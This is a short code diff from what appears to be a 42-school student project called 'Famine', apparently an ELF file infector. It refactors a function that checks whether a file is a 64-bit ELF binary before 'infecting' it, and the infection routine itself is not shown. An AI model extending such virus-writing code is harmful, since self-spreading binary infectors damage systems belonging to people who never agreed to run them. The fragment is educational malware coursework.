@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 02:06:39 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/07 02:26:10 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,9 +14,10 @@
 #include "infect.h"
 #include "syscall.h"
 #include "accessors.h"
+#include "errors.h"
 
-static bool	elf64_identifier(struct endians_pointer *endians, \
-			const Elf64_Ehdr *hdr)
+static bool	elf64_identifier(const Elf64_Ehdr *hdr, \
+			struct endians_pointer *endians)
 {
 	if (memcmp(hdr->e_ident, ELFMAG, SELFMAG) != 0 // wrong Magic
 	|| hdr->e_ident[EI_CLASS] != ELFCLASS64        // not 64bit
@@ -26,19 +27,19 @@ static bool	elf64_identifier(struct endians_pointer *endians, \
 		return false;
 
 	// set endian for the future
-	set_endian(&food.endians, e_ident[EI_DATA] == ELFDATA2MSB);
+	set_endian(endians, hdr->e_ident[EI_DATA] == ELFDATA2MSB);
 
 	return true;
 }
 
-inline void	infect_if_candidate(const char *file)
+inline bool	infect_if_candidate(const char *file)
 {
 	struct famine	food;
 	Elf64_Ehdr	elf64_hdr;
 	int		fd = famine_open(file, O_RDONLY);
 
 	if (fd < 0
-	|| famine_read(fd, &elf64_hdr, sizeof(elf64_hdr)) < sizeof(elf64_hdr)
+	|| famine_read(fd, &elf64_hdr, sizeof(elf64_hdr)) < (ssize_t)sizeof(elf64_hdr)
 	|| elf64_identifier(&elf64_hdr, &food.endians) == false)
 	{
 		famine_close(fd);
@@ -59,4 +60,6 @@ inline void	infect_if_candidate(const char *file)
 
 	free_accessor(food.original_safe);
 	free_accessor(food.clone_safe);
+
+	return true;
 }
